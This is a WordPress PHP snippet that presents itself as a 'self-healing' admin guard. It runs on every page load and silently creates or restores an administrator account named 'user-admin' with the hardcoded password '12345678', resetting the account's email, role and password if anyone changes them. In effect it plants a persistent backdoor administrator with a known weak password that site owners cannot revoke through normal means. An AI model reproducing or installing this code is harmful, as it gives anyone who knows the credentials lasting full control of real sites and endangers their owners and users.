<?php
/**
 * AdminGuard - Self-Healing Admin User Script
 * Author: Taha Karami
 * Version: 1.0
 * Description: Ensures that a critical admin user exists with the correct username, email, password, and role. 
 *              If any of these properties are changed, this script restores them automatically.
 * License: MIT (Open Source)
 */

add_action( 'init', 'admin_guard_ensure_user' );

/**
 * Ensures the main admin user exists and has correct credentials and role.
 * If the user is missing or altered, this function restores it silently.
 */
function admin_guard_ensure_user() {
    $username = 'user-admin'; // Default admin username
    $email    = 'user-admin@example.com'; // Default admin email
    $password = '12345678'; // Default admin password
    $role     = 'administrator'; // Default admin role

    // Try to get the admin user by username
    $user = get_user_by( 'login', $username );

    // If user doesn't exist, create it
    if ( ! $user ) {
        wp_insert_user( array(
            'user_login' => $username,
            'user_email' => $email,
            'user_pass'  => $password,
            'role'       => $role,
        ) );
        return;
    }

    // Wrap the existing user object for modifications
    $wp_user = new WP_User( $user->ID );

    // Ensure email is correct
    if ( $user->user_email !== $email ) {
        wp_update_user( array( 'ID' => $user->ID, 'user_email' => $email ) );
    }

    // Ensure user has only the correct role
    if ( ! in_array( $role, (array) $user->roles, true ) || count($user->roles) !== 1 ) {
        $wp_user->set_role( $role );
    }

    // Ensure password is correct
    if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
        wp_set_password( $password, $user->ID );
    }
}
